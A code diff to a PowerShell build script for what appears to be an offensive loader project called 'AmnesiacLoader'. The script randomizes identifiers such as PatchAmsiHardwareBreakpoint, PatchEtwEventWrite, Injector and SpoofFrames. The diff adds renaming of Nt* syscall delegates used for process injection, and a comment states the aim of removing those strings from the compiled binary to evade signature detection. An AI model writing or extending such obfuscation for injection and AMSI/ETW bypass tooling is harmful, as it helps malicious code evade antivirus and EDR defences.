@@ -49,30 +49,52 @@ $_sf   = New-RandId 10  # SpoofFrames method
 $_sr   = New-RandId 10  # SyscallResolver class
 $_ups  = New-RandId 10  # UnmanagedPS class
 
+# Syscall delegate type names -- PE metadata stores these verbatim; randomize to remove Nt* strings
+$_dOP  = New-RandId 10  # NtOpenProcessDelegate
+$_dAV  = New-RandId 10  # NtAllocateVirtualMemoryDelegate
+$_dWV  = New-RandId 10  # NtWriteVirtualMemoryDelegate
+$_dPV  = New-RandId 10  # NtProtectVirtualMemoryDelegate
+$_dST  = New-RandId 10  # NtSuspendThreadDelegate
+$_dRT  = New-RandId 10  # NtResumeThreadDelegate
+$_dGC  = New-RandId 10  # NtGetContextThreadDelegate
+$_dSC  = New-RandId 10  # NtSetContextThreadDelegate
+$_dCT  = New-RandId 10  # NtCreateThreadExDelegate
+$_dQA  = New-RandId 10  # NtQueueApcThreadDelegate
+
 Write-Host "[*] Generated random namespace: $_ns" -ForegroundColor Cyan
 
 # ── Substitution table (longest names first to avoid partial-match collisions) ─
 $subs = [ordered]@{
-    'AmnesiacLoader'              = $_ns
-    'ConcealLoadedAssembly'       = $_conc
-    'PatchAmsiHardwareBreakpoint' = $_phb
-    'GetKernelbaseGadget'         = $_kgg
-    'InjectUnmanagedPS'           = $_inPS
-    'SpawnUnmanagedPS'            = $_spwn
-    'PatchAmsiPageGuard'          = $_ppg
-    'PatchAmsiReflection'         = $_par
-    'PatchEtwEventWrite'          = $_pew
-    'SyscallResolver'             = $_sr
-    'NativeLoader'                = $_nl
-    'SleepMask'                   = $_sm
-    'MaskedSleep'                 = $_ms
-    'SpoofFrames'                 = $_sf
-    'CallStack'                   = $_cs
-    'UnmanagedPS'                 = $_ups
-    'GetGadget'                   = $_gg
-    'Injector'                    = $_inj
-    'Stomper'                     = $_stp
-    'Bypass'                      = $_byp
+    'AmnesiacLoader'                    = $_ns
+    'ConcealLoadedAssembly'             = $_conc
+    'PatchAmsiHardwareBreakpoint'       = $_phb
+    'NtAllocateVirtualMemoryDelegate'   = $_dAV
+    'NtProtectVirtualMemoryDelegate'    = $_dPV
+    'NtWriteVirtualMemoryDelegate'      = $_dWV
+    'NtGetContextThreadDelegate'        = $_dGC
+    'NtSetContextThreadDelegate'        = $_dSC
+    'NtCreateThreadExDelegate'          = $_dCT
+    'NtQueueApcThreadDelegate'          = $_dQA
+    'NtSuspendThreadDelegate'           = $_dST
+    'NtResumeThreadDelegate'            = $_dRT
+    'NtOpenProcessDelegate'             = $_dOP
+    'GetKernelbaseGadget'               = $_kgg
+    'InjectUnmanagedPS'                 = $_inPS
+    'SpawnUnmanagedPS'                  = $_spwn
+    'PatchAmsiPageGuard'                = $_ppg
+    'PatchAmsiReflection'               = $_par
+    'PatchEtwEventWrite'                = $_pew
+    'SyscallResolver'                   = $_sr
+    'NativeLoader'                      = $_nl
+    'SleepMask'                         = $_sm
+    'MaskedSleep'                       = $_ms
+    'SpoofFrames'                       = $_sf
+    'CallStack'                         = $_cs
+    'UnmanagedPS'                       = $_ups
+    'GetGadget'                         = $_gg
+    'Injector'                          = $_inj
+    'Stomper'                           = $_stp
+    'Bypass'                            = $_byp
 }
 
 # ── Copy sources to temp dir and apply substitutions ─────────────────────────
